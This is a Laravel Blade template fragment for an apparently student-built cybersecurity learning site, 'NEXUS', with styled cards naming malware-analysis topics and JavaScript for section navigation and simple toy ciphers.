                                        <div class="absolute inset-0 border-2 border-blue-400/50 rounded-full animate-ping"></div>
                                    </div>
                                </div>
                                
                                <h3 class="text-2xl font-bold text-blue-400 mb-6 text-center">SEMESTER 1 NODE</h3>
                                
                                <!-- Interactive Neural Connections -->
                                <div class="space-y-4">
                                    <div class="neural-connection group/connection">
                                        <div class="connection-indicator"></div>
                                        <div class="flex items-center">
                                            <i class="fas fa-lock text-cyan-400 mr-3 text-lg"></i>
                                            <div>
                                                <span class="text-gray-200 font-semibold">Encryption Fundamentals</span>
                                                <div class="w-full bg-gray-700 rounded-full h-2 mt-1">
                                                    <div class="bg-gradient-to-r from-cyan-500 to-blue-500 h-2 rounded-full w-3/4 animate-pulse"></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <div class="neural-connection group/connection">
                                        <div class="connection-indicator"></div>
                                        <div class="flex items-center">
                                            <i class="fas fa-search-plus text-purple-400 mr-3 text-lg"></i>
                                            <div>
                                                <span class="text-gray-200 font-semibold">RAT Analysis</span>
                                                <div class="w-full bg-gray-700 rounded-full h-2 mt-1">
                                                    <div class="bg-gradient-to-r from-purple-500 to-pink-500 h-2 rounded-full w-4/5 animate-pulse"></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <div class="neural-connection group/connection">
                                        <div class="connection-indicator"></div>
                                        <div class="flex items-center">
                                            <i class="fas fa-keyboard text-red-400 mr-3 text-lg"></i>
                                            <div>
                                                <span class="text-gray-200 font-semibold">Snake Keylogger</span>
                                                <div class="w-full bg-gray-700 rounded-full h-2 mt-1">
                                                    <div class="bg-gradient-to-r from-red-500 to-orange-500 h-2 rounded-full w-full animate-pulse"></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <div class="neural-connection group/connection">
                                        <div class="connection-indicator active"></div>
                                        <div class="flex items-center">
                                            <i class="fas fa-project-diagram text-emerald-400 mr-3 text-lg"></i>
                                            <div>
                                                <span class="text-emerald-400 font-semibold">Neural Flowchart</span>
                                                <div class="w-full bg-gray-700 rounded-full h-2 mt-1">
                                                    <div class="bg-gradient-to-r from-emerald-500 to-cyan-500 h-2 rounded-full w-full animate-pulse-bright"></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Future Development Neural Node -->
                    <div class="neural-node group relative">
                        <div class="connection-line connection-to-center"></div>
                        <div class="bg-gradient-to-br from-purple-900/50 to-pink-900/50 backdrop-blur-sm rounded-2xl p-8 border border-purple-500/40 relative overflow-hidden hover:border-purple-400/80 transition-all duration-500 transform hover:scale-105">
                            <!-- Quantum Field Effects -->
                            <div class="absolute inset-0 opacity-15">
                                <div class="quantum-field"></div>
                            </div>
                            
                            <div class="relative z-10">
                                <div class="flex items-center justify-center mb-6">
                                    <div class="w-20 h-20 bg-gradient-to-r from-purple-500 to-pink-500 rounded-full flex items-center justify-center relative">
                                        <i class="fas fa-rocket text-white text-2xl"></i>
                                        <div class="absolute inset-0 border-2 border-purple-400/50 rounded-full animate-ping"></div>
                                    </div>
                                </div>
                                
                                <h3 class="text-2xl font-bold text-purple-400 mb-6 text-center">FUTURE NODE</h3>
                                
                                <div class="space-y-4">
                                    <div class="neural-connection group/connection">
                                        <div class="connection-indicator pending"></div>
                                        <div class="flex items-center">
                                            <i class="fas fa-brain text-purple-400 mr-3 text-lg"></i>
                                            <div>
                                                <span class="text-gray-200 font-semibold">AI-Powered Security</span>
                                                <div class="w-full bg-gray-700 rounded-full h-2 mt-1">
                                                    <div class="bg-gradient-to-r from-purple-500 to-pink-500 h-2 rounded-full w-1/4 animate-pulse"></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <div class="neural-connection group/connection">
                                        <div class="connection-indicator pending"></div>
                                        <div class="flex items-center">
                                            <i class="fas fa-cloud text-cyan-400 mr-3 text-lg"></i>
                                            <div>
                                                <span class="text-gray-200 font-semibold">Cloud Integration</span>
                                                <div class="w-full bg-gray-700 rounded-full h-2 mt-1">
                                                    <div class="bg-gradient-to-r from-cyan-500 to-blue-500 h-2 rounded-full w-1/3 animate-pulse"></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <div class="neural-connection group/connection">
                                        <div class="connection-indicator pending"></div>
                                        <div class="flex items-center">
                                            <i class="fas fa-globe text-emerald-400 mr-3 text-lg"></i>
                                            <div>
                                                <span class="text-gray-200 font-semibold">Global Network</span>
                                                <div class="w-full bg-gray-700 rounded-full h-2 mt-1">
                                                    <div class="bg-gradient-to-r from-emerald-500 to-teal-500 h-2 rounded-full w-1/5 animate-pulse"></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- NEXUS x MYC Game Neural Node -->
                    <div class="neural-node group relative">
                        <div class="connection-line connection-to-center"></div>
                        <div class="bg-gradient-to-br from-cyan-900/50 to-teal-900/50 backdrop-blur-sm rounded-2xl p-8 border border-cyan-500/40 relative overflow-hidden hover:border-cyan-400/80 transition-all duration-500 transform hover:scale-105">
                            <!-- Game Field Effects -->
                            <div class="absolute inset-0 opacity-15">
                                <div class="game-particles"></div>
                            </div>
                            
                            <div class="relative z-10">
                                <div class="flex items-center justify-center mb-6">
                                    <div class="w-20 h-20 bg-gradient-to-r from-cyan-500 to-teal-500 rounded-full flex items-center justify-center relative">
                                        <i class="fas fa-gamepad text-white text-2xl"></i>
                                        <div class="absolute inset-0 border-2 border-cyan-400/50 rounded-full animate-ping"></div>
                                    </div>
                                </div>
                                
                                <h3 class="text-2xl font-bold bg-gradient-to-r from-cyan-400 to-teal-400 bg-clip-text text-transparent mb-6 text-center">MYC GAME NODE</h3>
                                
                                <div class="space-y-4">
                                    <div class="neural-connection group/connection">
                                        <div class="connection-indicator"></div>
                                        <div class="flex items-center">
                                            <i class="fas fa-puzzle-piece text-cyan-400 mr-3 text-lg"></i>
                                            <div>
                                                <span class="text-gray-200 font-semibold">Interactive Learning</span>
                                                <div class="w-full bg-gray-700 rounded-full h-2 mt-1">
                                                    <div class="bg-gradient-to-r from-cyan-500 to-teal-500 h-2 rounded-full w-4/5 animate-pulse"></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <div class="neural-connection group/connection">
                                        <div class="connection-indicator"></div>
                                        <div class="flex items-center">
                                            <i class="fas fa-clock text-pink-400 mr-3 text-lg"></i>
                                            <div>
                                                <span class="text-gray-200 font-semibold">Time Travel Engine</span>
                                                <div class="w-full bg-gray-700 rounded-full h-2 mt-1">
                                                    <div class="bg-gradient-to-r from-pink-500 to-purple-500 h-2 rounded-full w-3/5 animate-pulse"></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <div class="neural-connection group/connection">
                                        <div class="connection-indicator"></div>
                                        <div class="flex items-center">
                                            <i class="fas fa-users text-emerald-400 mr-3 text-lg"></i>
                                            <div>
                                                <span class="text-gray-200 font-semibold">Collaborative Hub</span>
                                                <div class="w-full bg-gray-700 rounded-full h-2 mt-1">
                                                    <div class="bg-gradient-to-r from-emerald-500 to-cyan-500 h-2 rounded-full w-2/3 animate-pulse"></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Neural Network Stats -->
                <div class="mt-16 grid grid-cols-1 md:grid-cols-4 gap-6">
                    <div class="neural-stat bg-emerald-900/30 border border-emerald-500/30 rounded-xl p-6 text-center">
                        <div class="text-3xl font-bold text-emerald-400">100%</div>
                        <div class="text-sm text-gray-400">Neural Connectivity</div>
                        <div class="w-full bg-gray-700 rounded-full h-2 mt-2">
                            <div class="bg-emerald-500 h-2 rounded-full w-full animate-pulse"></div>
                        </div>
                    </div>
                    
                    <div class="neural-stat bg-cyan-900/30 border border-cyan-500/30 rounded-xl p-6 text-center">
                        <div class="text-3xl font-bold text-cyan-400">4</div>
                        <div class="text-sm text-gray-400">Active Nodes</div>
                        <div class="w-full bg-gray-700 rounded-full h-2 mt-2">
                            <div class="bg-cyan-500 h-2 rounded-full w-4/5 animate-pulse"></div>
                        </div>
                    </div>
                    
                    <div class="neural-stat bg-purple-900/30 border border-purple-500/30 rounded-xl p-6 text-center">
                        <div class="text-3xl font-bold text-purple-400">∞</div>
                        <div class="text-sm text-gray-400">Scalability</div>
                        <div class="w-full bg-gray-700 rounded-full h-2 mt-2">
                            <div class="bg-purple-500 h-2 rounded-full w-full animate-pulse"></div>
                        </div>
                    </div>
                    
                    <div class="neural-stat bg-pink-900/30 border border-pink-500/30 rounded-xl p-6 text-center">
                        <div class="text-3xl font-bold text-pink-400">2025</div>
                        <div class="text-sm text-gray-400">Future Ready</div>
                        <div class="w-full bg-gray-700 rounded-full h-2 mt-2">
                            <div class="bg-pink-500 h-2 rounded-full w-full animate-pulse"></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Interactive Timeline View -->
        <div id="timeline-flowchart" class="flowchart-mode hidden bg-gradient-to-br from-cyan-900/30 via-blue-900/20 to-purple-900/30 backdrop-blur-sm rounded-3xl p-12 border border-cyan-500/40 mb-16 relative overflow-hidden">
            <div class="relative z-10">
                <h2 class="text-4xl font-bold text-center mb-12">
                    <span class="bg-gradient-to-r from-cyan-400 to-blue-400 bg-clip-text text-transparent">
                        🕒 NEXUS Development Timeline
                    </span>
                </h2>

                <!-- Timeline Container -->
                <div class="relative">
                    <!-- Central Timeline Line -->
                    <div class="absolute left-1/2 transform -translate-x-1/2 w-1 h-full bg-gradient-to-b from-cyan-500 via-blue-500 to-purple-500 rounded-full"></div>
                    
                    <div class="space-y-16">
                        <!-- Phase 1: Foundation -->
                        <div class="timeline-item flex items-center relative">
                            <div class="flex-1 pr-8 text-right">
                                <div class="bg-cyan-900/50 rounded-xl p-6 border border-cyan-500/30">
                                    <h3 class="text-xl font-bold text-cyan-400 mb-3">Phase 1: Foundation</h3>
                                    <p class="text-gray-300 text-sm mb-3">Establishing core security concepts and fundamental analysis techniques</p>
                                    <div class="space-y-2 text-xs text-gray-400">
                                        <div>• Encryption Research & Implementation</div>
                                        <div>• RAT Malware Deep Analysis</div>
                                        <div>• Security Framework Development</div>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="timeline-node">
                                <div class="w-16 h-16 bg-gradient-to-r from-cyan-500 to-blue-500 rounded-full flex items-center justify-center border-4 border-cyan-400/50">
                                    <i class="fas fa-foundation text-white text-xl"></i>
                                </div>
                            </div>
                            
                            <div class="flex-1 pl-8">
                                <div class="text-sm text-gray-400">
                                    <div>Duration: First Semester</div>
                                    <div>Status: <span class="text-emerald-400">✓ Completed</span></div>
                                    <div>Progress: 100%</div>
                                </div>
                            </div>
                        </div>

                        <!-- Phase 2: Advanced Analysis -->
                        <div class="timeline-item flex items-center relative">
                            <div class="flex-1 pr-8 text-right">
                                <div class="text-sm text-gray-400">
                                    <div>Duration: Current Phase</div>
                                    <div>Status: <span class="text-yellow-400">⚡ Active</span></div>
                                    <div>Progress: 85%</div>
                                </div>
                            </div>
                            
                            <div class="timeline-node">
                                <div class="w-16 h-16 bg-gradient-to-r from-orange-500 to-red-500 rounded-full flex items-center justify-center border-4 border-orange-400/50 animate-pulse">
                                    <i class="fas fa-microscope text-white text-xl"></i>
                                </div>
                            </div>
                            
                            <div class="flex-1 pl-8">
                                <div class="bg-orange-900/50 rounded-xl p-6 border border-orange-500/30">
                                    <h3 class="text-xl font-bold text-orange-400 mb-3">Phase 2: Advanced Analysis</h3>
                                    <p class="text-gray-300 text-sm mb-3">Deep-dive malware analysis and sophisticated attack vector research</p>
                                    <div class="space-y-2 text-xs text-gray-400">
                                        <div>• Snake Keylogger Reverse Engineering</div>
                                        <div>• Neural Network Flowchart Design</div>
                                        <div>• Interactive Visualization Development</div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Phase 3: Game Integration -->
                        <div class="timeline-item flex items-center relative">
                            <div class="flex-1 pr-8 text-right">
                                <div class="bg-purple-900/50 rounded-xl p-6 border border-purple-500/30">
                                    <h3 class="text-xl font-bold text-purple-400 mb-3">Phase 3: Game Integration</h3>
                                    <p class="text-gray-300 text-sm mb-3">Merging educational content with interactive gaming experience</p>
                                    <div class="space-y-2 text-xs text-gray-400">
                                        <div>• NEXUS x MYC Platform Integration</div>
                                        <div>• Time Travel Learning Scenarios</div>
                                        <div>• Collaborative Mission Framework</div>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="timeline-node">
                                <div class="w-16 h-16 bg-gradient-to-r from-purple-500 to-pink-500 rounded-full flex items-center justify-center border-4 border-purple-400/50">
                                    <i class="fas fa-gamepad text-white text-xl"></i>
                                </div>
                            </div>
                            
                            <div class="flex-1 pl-8">
                                <div class="text-sm text-gray-400">
                                    <div>Duration: Next Semester</div>
                                    <div>Status: <span class="text-cyan-400">🔄 Planned</span></div>
                                    <div>Progress: 30%</div>
                                </div>
                            </div>
                        </div>

                        <!-- Phase 4: Research Publication -->
                        <div class="timeline-item flex items-center relative">
                            <div class="flex-1 pr-8 text-right">
                                <div class="text-sm text-gray-400">
                                    <div>Duration: Final Phase</div>
                                    <div>Status: <span class="text-blue-400">📋 Future</span></div>
                                    <div>Progress: 10%</div>
                                </div>
                            </div>
                            
                            <div class="timeline-node">
                                <div class="w-16 h-16 bg-gradient-to-r from-emerald-500 to-teal-500 rounded-full flex items-center justify-center border-4 border-emerald-400/50">
                                    <i class="fas fa-trophy text-white text-xl"></i>
                                </div>
                            </div>
                            
                            <div class="flex-1 pl-8">
                                <div class="bg-emerald-900/50 rounded-xl p-6 border border-emerald-500/30">
                                    <h3 class="text-xl font-bold text-emerald-400 mb-3">Phase 4: Research Publication</h3>
                                    <p class="text-gray-300 text-sm mb-3">Academic research compilation and knowledge sharing</p>
                                    <div class="space-y-2 text-xs text-gray-400">
                                        <div>• Comprehensive Research Documentation</div>
                                        <div>• Academic Paper Publication</div>
                                        <div>• Community Knowledge Sharing</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Architecture Diagram View -->
        <div id="architecture-flowchart" class="flowchart-mode hidden bg-gradient-to-br from-purple-900/30 via-pink-900/20 to-red-900/30 backdrop-blur-sm rounded-3xl p-12 border border-purple-500/40 mb-16 relative overflow-hidden">
            <div class="relative z-10">
                <h2 class="text-4xl font-bold text-center mb-12">
                    <span class="bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">
                        🏗️ NEXUS System Architecture
                    </span>
                </h2>

                <!-- Architecture Layers -->
                <div class="space-y-8">
                    <!-- Presentation Layer -->
                    <div class="architecture-layer bg-blue-900/40 rounded-2xl p-8 border border-blue-500/30">
                        <h3 class="text-2xl font-bold text-blue-400 mb-6 text-center">
                            <i class="fas fa-desktop mr-3"></i>Presentation Layer
                        </h3>
                        <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
                            <div class="architecture-component bg-cyan-900/50 rounded-lg p-4 border border-cyan-500/30">
                                <i class="fas fa-palette text-cyan-400 text-xl mb-2"></i>
                                <h4 class="font-semibold text-cyan-400">Frontend UI</h4>
                                <p class="text-xs text-gray-400">Responsive interface design</p>
                            </div>
                            <div class="architecture-component bg-blue-900/50 rounded-lg p-4 border border-blue-500/30">
                                <i class="fas fa-mobile-alt text-blue-400 text-xl mb-2"></i>
                                <h4 class="font-semibold text-blue-400">Mobile Views</h4>
                                <p class="text-xs text-gray-400">Cross-platform compatibility</p>
                            </div>
                            <div class="architecture-component bg-purple-900/50 rounded-lg p-4 border border-purple-500/30">
                                <i class="fas fa-paint-brush text-purple-400 text-xl mb-2"></i>
                                <h4 class="font-semibold text-purple-400">Theme Engine</h4>
                                <p class="text-xs text-gray-400">Dynamic styling system</p>
                            </div>
                            <div class="architecture-component bg-pink-900/50 rounded-lg p-4 border border-pink-500/30">
                                <i class="fas fa-gamepad text-pink-400 text-xl mb-2"></i>
                                <h4 class="font-semibold text-pink-400">Game Interface</h4>
                                <p class="text-xs text-gray-400">Interactive learning modules</p>
                            </div>
                        </div>
                    </div>

                    <!-- Application Layer -->
                    <div class="architecture-layer bg-green-900/40 rounded-2xl p-8 border border-green-500/30">
                        <h3 class="text-2xl font-bold text-green-400 mb-6 text-center">
                            <i class="fas fa-cogs mr-3"></i>Application Layer
                        </h3>
                        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                            <div class="architecture-component bg-emerald-900/50 rounded-lg p-4 border border-emerald-500/30">
                                <i class="fas fa-shield-alt text-emerald-400 text-xl mb-2"></i>
                                <h4 class="font-semibold text-emerald-400">Security Core</h4>
                                <p class="text-xs text-gray-400">Malware analysis engine</p>
                            </div>
                            <div class="architecture-component bg-teal-900/50 rounded-lg p-4 border border-teal-500/30">
                                <i class="fas fa-brain text-teal-400 text-xl mb-2"></i>
                                <h4 class="font-semibold text-teal-400">Neural Network</h4>
                                <p class="text-xs text-gray-400">AI-powered processing</p>
                            </div>
                            <div class="architecture-component bg-green-900/50 rounded-lg p-4 border border-green-500/30">
                                <i class="fas fa-puzzle-piece text-green-400 text-xl mb-2"></i>
                                <h4 class="font-semibold text-green-400">Game Engine</h4>
                                <p class="text-xs text-gray-400">Educational gameplay logic</p>
                            </div>
                        </div>
                    </div>

                    <!-- Data Layer -->
                    <div class="architecture-layer bg-orange-900/40 rounded-2xl p-8 border border-orange-500/30">
                        <h3 class="text-2xl font-bold text-orange-400 mb-6 text-center">
                            <i class="fas fa-database mr-3"></i>Data Layer
                        </h3>
                        <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
                            <div class="architecture-component bg-red-900/50 rounded-lg p-4 border border-red-500/30">
                                <i class="fas fa-bug text-red-400 text-xl mb-2"></i>
                                <h4 class="font-semibold text-red-400">Malware Samples</h4>
                                <p class="text-xs text-gray-400">Secure specimen storage</p>
                            </div>
                            <div class="architecture-component bg-yellow-900/50 rounded-lg p-4 border border-yellow-500/30">
                                <i class="fas fa-chart-bar text-yellow-400 text-xl mb-2"></i>
                                <h4 class="font-semibold text-yellow-400">Analytics Data</h4>
                                <p class="text-xs text-gray-400">Research metrics & stats</p>
                            </div>
                            <div class="architecture-component bg-orange-900/50 rounded-lg p-4 border border-orange-500/30">
                                <i class="fas fa-users text-orange-400 text-xl mb-2"></i>
                                <h4 class="font-semibold text-orange-400">User Profiles</h4>
                                <p class="text-xs text-gray-400">Learning progress tracking</p>
                            </div>
                            <div class="architecture-component bg-pink-900/50 rounded-lg p-4 border border-pink-500/30">
                                <i class="fas fa-trophy text-pink-400 text-xl mb-2"></i>
                                <h4 class="font-semibold text-pink-400">Achievement System</h4>
                                <p class="text-xs text-gray-400">Gamification data</p>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- System Metrics -->
                <div class="mt-12 grid grid-cols-2 md:grid-cols-4 gap-4">
                    <div class="metric-card bg-purple-900/50 rounded-lg p-4 text-center border border-purple-500/30">
                        <div class="text-2xl font-bold text-purple-400">99.9%</div>
                        <div class="text-xs text-gray-400">System Uptime</div>
                    </div>
                    <div class="metric-card bg-pink-900/50 rounded-lg p-4 text-center border border-pink-500/30">
                        <div class="text-2xl font-bold text-pink-400">< 100ms</div>
                        <div class="text-xs text-gray-400">Response Time</div>
                    </div>
                    <div class="metric-card bg-cyan-900/50 rounded-lg p-4 text-center border border-cyan-500/30">
                        <div class="text-2xl font-bold text-cyan-400">∞</div>
                        <div class="text-xs text-gray-400">Scalability</div>
                    </div>
                    <div class="metric-card bg-emerald-900/50 rounded-lg p-4 text-center border border-emerald-500/30">
                        <div class="text-2xl font-bold text-emerald-400">🔒</div>
                        <div class="text-xs text-gray-400">Security Level</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Call to Action Section -->
        <div class="bg-gradient-to-r from-emerald-900/30 via-cyan-900/20 to-blue-900/30 backdrop-blur-sm rounded-2xl p-8 border border-emerald-500/40 text-center">
            <h3 class="text-3xl font-bold text-white mb-4">
                <span class="bg-gradient-to-r from-emerald-400 to-cyan-400 bg-clip-text text-transparent">
                    🚀 Ready to Explore the NEXUS?
                </span>
            </h3>
            <p class="text-gray-300 mb-8 max-w-2xl mx-auto">
                Dive deeper into each component of the NEXUS ecosystem and discover the interconnected world of cybersecurity research, 
                interactive learning, and cutting-edge technology.
            </p>
            <div class="flex justify-center space-x-4">
                <button onclick="showSection('encryption')" class="bg-emerald-600 hover:bg-emerald-700 text-white px-6 py-3 rounded-lg font-semibold transition-all duration-300 transform hover:scale-105">
                    <i class="fas fa-lock mr-2"></i>Explore Encryption
                </button>
                <button onclick="showSection('rat-analysis')" class="bg-purple-600 hover:bg-purple-700 text-white px-6 py-3 rounded-lg font-semibold transition-all duration-300 transform hover:scale-105">
                    <i class="fas fa-search mr-2"></i>Analyze RAT
                </button>
                <button onclick="showSection('snake-keylogger')" class="bg-red-600 hover:bg-red-700 text-white px-6 py-3 rounded-lg font-semibold transition-all duration-300 transform hover:scale-105">
                    <i class="fas fa-keyboard mr-2"></i>Study Keylogger
                </button>
            </div>
        </div>
    </section></section>
</div>
@endsection

@section('scripts')
<script>    document.addEventListener('DOMContentLoaded', function() {
        // Section switching functionality
        const sectionCards = document.querySelectorAll('.section-card');
        const sections = document.querySelectorAll('.section-content');
        const overviewSection = document.getElementById('overview');
        
        // Add click handlers to section cards
        sectionCards.forEach(card => {
            card.addEventListener('click', function() {
                const sectionName = this.getAttribute('data-section');
                showSection(sectionName);
            });
        });
        
        // Add pulse effect to interactive elements
        document.querySelectorAll('.encrypt-btn').forEach(btn => {
            btn.classList.add('pulse-on-hover');
        });
        
        // Show overview by default
        showOverview();
        
        // Animate sections on scroll
        const animateElements = document.querySelectorAll('.bg-white\\/5, .grid > div, .encryption-demo, .algo-card');
        
        const observer = new IntersectionObserver((entries) => {
            entries.forEach((entry, index) => {
                if (entry.isIntersecting) {
                    entry.target.style.opacity = '0';
                    entry.target.style.transform = 'translateY(40px)';
                    
                    setTimeout(() => {
                        entry.target.style.transition = 'opacity 0.8s ease, transform 0.8s ease';
                        entry.target.style.opacity = '1';
                        entry.target.style.transform = 'translateY(0)';
                    }, index * 100);
                }
            });
        }, { threshold: 0.1 });

        animateElements.forEach(element => observer.observe(element));
        // Add keyboard shortcuts
        document.addEventListener('keydown', function(event) {
            if (event.ctrlKey || event.metaKey) {
                switch(event.key) {
                    case '1':
                         event.preventDefault();
                window.location.href = "{{ route('nexus.encryption') }}";
                        break;
                    case '2':
                        event.preventDefault();
                        showSection('rat-analysis');
                        break;
                    case '3':
                        event.preventDefault();
                        showSection('snake-keylogger');
                        break;
                    case '4':
                        event.preventDefault();
                        showSection('nexus-flowchart');
                        break;
                    case 'h':
                        event.preventDefault();
                        showOverview();
                        break;
                }
            }
        });
        
        // Initialize tooltips
        initializeTooltips();
    });
    
    
    // Utility Functions
    function initializeTooltips() {
        // Add keyboard shortcut hints
        document.querySelectorAll('[data-section]').forEach((card, index) => {
            const shortcut = `Ctrl+${index + 1}`;
            card.setAttribute('title', `Click or press ${shortcut} to access this section`);
        });
    }
    
    function showNotification(message, type = 'info', duration = 3000) {
        // Create notification element
        const notification = document.createElement('div');
        notification.className = `fixed top-4 right-4 z-50 p-4 rounded-lg shadow-lg transform translate-x-full transition-transform duration-300`;
        
        // Set notification style based on type
        switch(type) {
            case 'success':
                notification.classList.add('bg-green-600', 'text-white');
                notification.innerHTML = `<i class="fas fa-check-circle mr-2"></i>${message}`;
                break;
            case 'error':
                notification.classList.add('bg-red-600', 'text-white');
                notification.innerHTML = `<i class="fas fa-exclamation-circle mr-2"></i>${message}`;
                break;
            case 'warning':
                notification.classList.add('bg-yellow-600', 'text-white');
                notification.innerHTML = `<i class="fas fa-exclamation-triangle mr-2"></i>${message}`;
                break;
            default:
                notification.classList.add('bg-blue-600', 'text-white');
                notification.innerHTML = `<i class="fas fa-info-circle mr-2"></i>${message}`;
        }
        
        document.body.appendChild(notification);
        
        // Animate in
        setTimeout(() => {
            notification.classList.remove('translate-x-full');
        }, 100);
        
        // Auto-dismiss
        setTimeout(() => {
            notification.classList.add('translate-x-full');
            setTimeout(() => {
                document.body.removeChild(notification);
            }, 300);
        }, duration);
    }
    
    function addLoadingState(element) {
        element.classList.add('loading');
        element.style.pointerEvents = 'none';
    }
    
    function removeLoadingState(element) {
        element.classList.remove('loading');
        element.style.pointerEvents = 'auto';
    }
    
    function addSuccessAnimation(element) {
        element.classList.add('success-bounce');
        setTimeout(() => {
            element.classList.remove('success-bounce');
        }, 600);
    }
    
    function addErrorAnimation(element) {
        element.classList.add('error-shake');
        setTimeout(() => {
            element.classList.remove('error-shake');
        }, 500);
    }
    
    // Enhanced Error Handling removed - functionality available on dedicated encryption page
    
    function handleDecryptionError(error, element) {
        console.error('Decryption error:', error);
        addErrorAnimation(element);
        showNotification('Decryption failed. Please check your password and try again.', 'error');
    }
    
    // Section management functions
    function showSection(sectionName) {
        // Hide overview with transition
        const overview = document.getElementById('overview');
        overview.classList.add('hidden');
        
        // Hide all section content
        document.querySelectorAll('.section-content').forEach(section => {
            section.classList.remove('active');
            section.style.display = 'none';
        });
        
        // Try different possible section IDs
        let targetSection = document.getElementById(sectionName) || 
                          document.getElementById(sectionName + '-content');
        
        if (targetSection) {
            // First set display to block
            targetSection.style.display = 'block';
            
            // Force a reflow to ensure the transition works
            targetSection.offsetHeight;
            
            // Then add active class for transition
            targetSection.classList.add('active');
            
            // Update active card
            document.querySelectorAll('.section-card').forEach(card => {
                card.classList.remove('active');
            });
            const activeCard = document.querySelector(`[data-section="${sectionName}"]`);
            if (activeCard) {
                activeCard.classList.add('active');
            }
            
            // Scroll to top
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
    }

    function showOverview() {
        // Hide all section content with transition
        document.querySelectorAll('.section-content').forEach(section => {
            section.classList.remove('active');
            // Wait for transition to complete before hiding
            setTimeout(() => {
                section.style.display = 'none';
            }, 500);
        });
        
        // Show overview with transition
        const overview = document.getElementById('overview');
        overview.style.display = 'block';
        
        // Force a reflow
        overview.offsetHeight;
        
        // Remove hidden class to trigger transition
        overview.classList.remove('hidden');
        
        // Remove active state from cards
        document.querySelectorAll('.section-card').forEach(card => {
            card.classList.remove('active');
        });
        
        // Scroll to top
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    // Text encryption functionality removed - available on dedicated encryption page
    
    function caesarCipher(text, shift) {
        return text.replace(/[a-zA-Z]/g, function(char) {
            const start = char <= 'Z' ? 65 : 97;
            return String.fromCharCode(((char.charCodeAt(0) - start + shift) % 26) + start);
        });
    }
    
    function rot13(text) {
        return text.replace(/[a-zA-Z]/g, function(char) {
            const start = char <= 'Z' ? 65 : 97;
            return String.fromCharCode(((char.charCodeAt(0) - start + 13) % 26) + start);
        });
    }
    
    function handleImageUpload(event) {
        const file = event.target.files[0];
        if (!file) return;
        
        const reader = new FileReader();
        reader.onload = function(e) {
            const img = new Image();
            img.onload = function() {
                const canvas = document.getElementById('imageCanvas');
                const ctx = canvas.getContext('2d');
                
                canvas.width = img.width;
                canvas.height = img.height;
                ctx.drawImage(img, 0, 0);
                
                document.getElementById('imagePreview').classList.remove('hidden');
            };
            img.src = e.target.result;
        };
        reader.readAsDataURL(file);
    }
      // Image encryption functionality removed - available on dedicated encryption page
      // Text Decryption Functions
    function decryptText(algorithm) {
        const input = document.getElementById('textDecryptInput').value;
        const output = document.getElementById('textDecryptOutput');
        
        if (!input.trim()) {
            output.innerHTML = '<span class="text-red-400">Please enter encrypted text to decrypt</span>';
            return;
        }
        
        let result = '';
        
        try {
            switch(algorithm) {
                case 'caesar':
                    result = caesarCipher(input, -3); // Reverse Caesar cipher
                    break;
                case 'base64':
                    result = atob(input);
                    break;
                case 'rot13':
                    result = rot13(input); // ROT13 is its own inverse
                    break;
                case 'reverse':
                    result = input.split('').reverse().join('');
                    break;
            }
            output.innerHTML = `<span class="text-green-400">${result}</span>`;
        } catch (error) {
            output.innerHTML = '<span class="text-red-400">Invalid encrypted text or wrong algorithm</span>';
        }
        
        // Add animation
        output.style.transform = 'scale(0.95)';
        setTimeout(() => {
            output.style.transition = 'transform 0.3s ease';
            output.style.transform = 'scale(1)';
        }, 100);
    }
    
    // Copy to Clipboard Function
    function copyToClipboard(elementId) {
        const element = document.getElementById(elementId);
        const text = element.textContent;
        
        if (!text || text.includes('Please enter')) {
            alert('No content to copy');
            return;
        }
        
        navigator.clipboard.writeText(text).then(() => {
            // Show success feedback
            const originalHTML = element.innerHTML;
            element.innerHTML = '<span class="text-green-400"><i class="fas fa-check mr-2"></i>Copied to clipboard!</span>';
            
            setTimeout(() => {
                element.innerHTML = originalHTML;
            }, 2000);
        }).catch(() => {
            // Fallback for older browsers
            const textArea = document.createElement('textarea');
            textArea.value = text;
            document.body.appendChild(textArea);
            textArea.select();
            document.execCommand('copy');
            document.body.removeChild(textArea);
            
            alert('Text copied to clipboard!');
        });
    }
    
    // File Upload Handlers
    let selectedFile = null;
    let encryptedFile = null;
    let decryptedFile = null;
    let selectedEncryptedFile = null;
    
    function handleFileUpload(event) {
        const file = event.target.files[0];
        if (file) {
            selectedFile = file;
            showFileInfo(file, 'fileInfo', 'fileName', 'fileSize', 'fileStatus');
        }
    }
      // File upload handlers removed - functionality available on dedicated encryption page
    
    function handleDragOver(event) {
        event.preventDefault();
        event.currentTarget.classList.add('dragover');
    }
    
    function handleDragLeave(event) {
        event.preventDefault();
        event.currentTarget.classList.remove('dragover');
    }
    
    function handleFileDrop(event) {
        event.preventDefault();
        event.currentTarget.classList.remove('dragover');
        
        const file = event.dataTransfer.files[0];
        if (file) {
            selectedFile = file;
            showFileInfo(file, 'fileInfo', 'fileName', 'fileSize', 'fileStatus');
            // Trigger the file input
            document.getElementById('fileInput').files = event.dataTransfer.files;        }
    }

